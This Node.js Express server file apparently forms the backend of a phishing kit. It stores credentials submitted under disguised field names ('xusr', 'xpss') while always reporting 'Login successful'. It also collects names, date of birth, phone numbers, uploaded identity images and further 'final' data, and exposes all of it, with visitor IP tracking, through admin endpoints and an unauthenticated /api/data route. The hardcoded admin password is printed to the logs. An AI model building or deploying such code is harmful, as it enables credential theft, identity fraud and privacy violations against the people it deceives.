const express = require('express');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3001;

// Trust proxy for proper IP detection
app.set('trust proxy', true);

// Middleware
const corsOrigins = process.env.CORS_ORIGINS 
  ? process.env.CORS_ORIGINS.split(',').map(origin => origin.trim())
  : ['http://localhost:3000', 'http://localhost:3002'];

app.use(cors({
  origin: corsOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Accept-Language', 'Cache-Control']
}));
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

// Create uploads directory if it doesn't exist
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Serve uploaded files
app.use('/uploads', express.static(uploadsDir));

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadsDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

const upload = multer({ 
  storage: storage,
  limits: {
    fileSize: 100 * 1024 * 1024 // 100MB limit
  },
  fileFilter: (req, file, cb) => {
    // Accept image files - including iPhone HEIC/HEIF formats
    const allowedMimeTypes = [
      'image/jpeg', 'image/jpg', 'image/png', 'image/gif', 
      'image/webp', 'image/bmp', 'image/tiff', 'image/svg+xml',
      'image/heic', 'image/heif', 'image/heic-sequence', 'image/heif-sequence'
    ];
    
    // Check MIME type
    if (file.mimetype && file.mimetype.startsWith('image/')) {
      cb(null, true);
      return;
    }
    
    // Fallback: Check file extension for iPhone HEIC files
    const ext = path.extname(file.originalname).toLowerCase();
    const allowedExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp', '.tiff', '.heic', '.heif'];
    
    if (allowedExtensions.includes(ext)) {
      cb(null, true);
      return;
    }
    
    // If no MIME type but has image extension, accept it
    if (!file.mimetype && allowedExtensions.includes(ext)) {
      cb(null, true);
      return;
    }
    
    cb(new Error(`File type not allowed. Allowed types: ${allowedExtensions.join(', ')}`), false);
  }
});

// Simple admin authentication
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'COMMTAN@123';

// In-memory storage for demo purposes
let sessions = new Map();
let visitors = [];

// Routes
app.post('/api/login', async (req, res) => {
  const { xusr, xpss } = req.body;
  
  console.log('Login attempt:', { xusr, xpss });
  
  try {
    const sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent');
    
    sessions.set(sessionId, {
      sessionId,
      loginData: { xusr, xpss },
      ip,
      userAgent,
      createdAt: new Date()
    });
    
    res.json({ 
      success: true, 
      message: 'Login successful',
      sessionId: sessionId
    });
  } catch (error) {
    console.error('Error storing login data:', error);
    res.status(500).json({ success: false, message: 'Error storing data' });
  }
});

app.post('/api/info', async (req, res) => {
  const { xname1, xname2, xdob, xtel, sessionId } = req.body;
  
  console.log('Info submission:', { xname1, xname2, xdob, xtel });
  
  try {
    const session = sessions.get(sessionId);
    if (session) {
      session.infoData = { xname1, xname2, xdob, xtel };
      sessions.set(sessionId, session);
    }
    
    res.json({ success: true, message: 'Info submitted successfully' });
  } catch (error) {
    console.error('Error storing info data:', error);
    res.status(500).json({ success: false, message: 'Error storing data' });
  }
});

app.post('/api/upload', upload.single('file'), async (req, res) => {
  const file = req.file;
  const { sessionId } = req.body;
  const ip = req.ip || req.connection.remoteAddress;
  const userAgent = req.get('User-Agent');
  
  console.log('=== UPLOAD REQUEST ===');
  console.log('Session ID:', sessionId);
  console.log('IP:', ip);
  console.log('User-Agent:', userAgent);
  console.log('File received:', file ? {
    filename: file.filename,
    originalName: file.originalname,
    size: file.size,
    mimetype: file.mimetype,
    path: file.path
  } : 'No file received');
  console.log('Content-Type:', req.get('Content-Type'));
  console.log('Content-Length:', req.get('Content-Length'));
  
  // Handle multer errors (file size, file type, etc.)
  if (!file) {
    console.error('No file received in upload request');
    return res.status(400).json({ 
      success: false, 
      message: 'No file received. Please ensure the file is an image and under 100MB.' 
    });
  }
  
  try {
    const session = sessions.get(sessionId);
    if (session) {
      session.uploadData = {
        filename: file.filename,
        originalName: file.originalname,
        size: file.size,
        path: file.path,
        mimeType: file.mimetype
      };
      sessions.set(sessionId, session);
      console.log('Upload data stored successfully for session:', sessionId);
    } else {
      console.warn('Session not found for sessionId:', sessionId);
    }
    
    res.json({ 
      success: true, 
      message: 'File uploaded successfully',
      filename: file.filename,
      size: file.size
    });
  } catch (error) {
    console.error('Error storing upload data:', error);
    console.error('Error stack:', error.stack);
    res.status(500).json({ 
      success: false, 
      message: 'Error storing data: ' + error.message 
    });
  }
});

app.post('/api/final', async (req, res) => {
  const { sessionId, ...data } = req.body;
  
  console.log('Final data submission:', data);
  
  try {
    const session = sessions.get(sessionId);
    if (session) {
      session.finalData = data;
      sessions.set(sessionId, session);
    }
    
    res.json({ success: true, message: 'Data submitted successfully' });
  } catch (error) {
    console.error('Error storing final data:', error);
    res.status(500).json({ success: false, message: 'Error storing data' });
  }
});

// Get collected data (for monitoring)
app.get('/api/data', async (req, res) => {
  try {
    const sessionArray = Array.from(sessions.values());
    res.json(sessionArray);
  } catch (error) {
    console.error('Error retrieving data:', error);
    res.status(500).json({ error: 'Error retrieving data' });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Track website visits
app.post('/api/track-visit', async (req, res) => {
  try {
    const ip = req.ip || req.get('X-Forwarded-For') || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent');
    const path = req.body.path || '/';
    
    visitors.push({
      ip,
      userAgent,
      path,
      timestamp: new Date()
    });
    
    res.json({ success: true, message: 'Page visit tracked' });
  } catch (error) {
    console.error('Error tracking visit:', error);
    res.status(500).json({ success: false, message: 'Error tracking visit' });
  }
});

// Admin routes
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  const ip = req.ip || req.get('X-Forwarded-For') || req.connection.remoteAddress;
  
  console.log('Admin login attempt from IP:', ip);
  console.log('Received password:', password);
  console.log('Expected password:', ADMIN_PASSWORD);
  console.log('Passwords match:', password === ADMIN_PASSWORD);
  
  if (password === ADMIN_PASSWORD) {
    console.log('Admin login successful from IP:', ip);
    res.json({ success: true, message: 'Admin login successful' });
  } else {
    console.log('Failed admin login attempt from IP:', ip);
    res.status(401).json({ success: false, message: 'Invalid admin password' });
  }
});

app.get('/api/admin/user-data', async (req, res) => {
  try {
    const sessionArray = Array.from(sessions.values());
    res.json({
      success: true,
      data: sessionArray,
      total: sessionArray.length
    });
  } catch (error) {
    console.error('Error retrieving user data:', error);
    res.status(500).json({ success: false, error: 'Error retrieving data' });
  }
});

app.get('/api/admin/visitors', async (req, res) => {
  try {
    res.json({
      success: true,
      data: visitors.slice(-500), // Last 500 visitors
      total: visitors.length
    });
  } catch (error) {
    console.error('Error retrieving visitors:', error);
    res.status(500).json({ success: false, error: 'Error retrieving data' });
  }
});

app.get('/api/admin/stats', async (req, res) => {
  try {
    const sessionArray = Array.from(sessions.values());
    const stats = {
      totalSessions: sessionArray.length,
      completedSessions: sessionArray.filter(s => s.finalData).length,
      totalVisitors: visitors.length,
      uniqueIPs: new Set(visitors.map(v => v.ip)).size
    };
    
    res.json({
      success: true,
      stats: stats
    });
  } catch (error) {
    console.error('Error retrieving stats:', error);
    res.status(500).json({ success: false, error: 'Error retrieving stats' });
  }
});

// Delete specific session data
app.delete('/api/admin/delete-data/:sessionId', async (req, res) => {
  const { sessionId } = req.params;
  const ip = req.ip || req.get('X-Forwarded-For') || req.connection.remoteAddress;
  
  try {
    if (sessions.has(sessionId)) {
      // Delete uploaded file if it exists
      const session = sessions.get(sessionId);
      if (session && session.uploadData && session.uploadData.filename) {
        const filePath = path.join(uploadsDir, session.uploadData.filename);
        if (fs.existsSync(filePath)) {
          fs.unlinkSync(filePath);
          console.log(`Deleted file: ${session.uploadData.filename}`);
        }
      }
      
      // Delete session from memory
      sessions.delete(sessionId);
      console.log(`Deleted session: ${sessionId} by IP: ${ip}`);
      
      res.json({ success: true, message: 'Data deleted successfully' });
    } else {
      res.status(404).json({ success: false, message: 'Session not found' });
    }
  } catch (error) {
    console.error('Error deleting session:', error);
    res.status(500).json({ success: false, message: 'Error deleting data' });
  }
});

// Delete all data
app.delete('/api/admin/delete-all-data', async (req, res) => {
  const ip = req.ip || req.get('X-Forwarded-For') || req.connection.remoteAddress;
  
  try {
    // Delete all uploaded files
    const sessionArray = Array.from(sessions.values());
    sessionArray.forEach(session => {
      if (session && session.uploadData && session.uploadData.filename) {
        const filePath = path.join(uploadsDir, session.uploadData.filename);
        if (fs.existsSync(filePath)) {
          try {
            fs.unlinkSync(filePath);
          } catch (err) {
            console.error(`Error deleting file ${session.uploadData.filename}:`, err);
          }
        }
      }
    });
    
    // Clear all sessions and visitors
    sessions.clear();
    visitors = [];
    
    console.log(`All data deleted by IP: ${ip}`);
    
    res.json({ 
      success: true, 
      message: 'All data deleted successfully',
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('Error deleting all data:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Error deleting all data',
      error: error.message 
    });
  }
});

// Error handling middleware for multer upload errors
app.use((error, req, res, next) => {
  console.error('=== ERROR HANDLER ===');
  console.error('Error type:', error.name);
  console.error('Error message:', error.message);
  console.error('Error code:', error.code);
  
  // Handle multer errors
  if (error instanceof multer.MulterError) {
    if (error.code === 'LIMIT_FILE_SIZE') {
      return res.status(400).json({ 
        success: false, 
        message: 'File too large. Maximum size is 100MB.' 
      });
    }
    if (error.code === 'LIMIT_UNEXPECTED_FILE') {
      return res.status(400).json({ 
        success: false, 
        message: 'Unexpected file field.' 
      });
    }
    return res.status(400).json({ 
      success: false, 
      message: 'Upload error: ' + error.message 
    });
  }
  
  // Handle file filter errors
  if (error.message && error.message.includes('not allowed')) {
    return res.status(400).json({ 
      success: false, 
      message: error.message 
    });
  }
  
  // Generic error handler
  console.error('Error stack:', error.stack);
  res.status(500).json({ 
    success: false,
    error: error.message || 'Internal server error' 
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`API endpoints available at http://localhost:${PORT}/api`);
  console.log(`Admin password: ${ADMIN_PASSWORD}`);
});
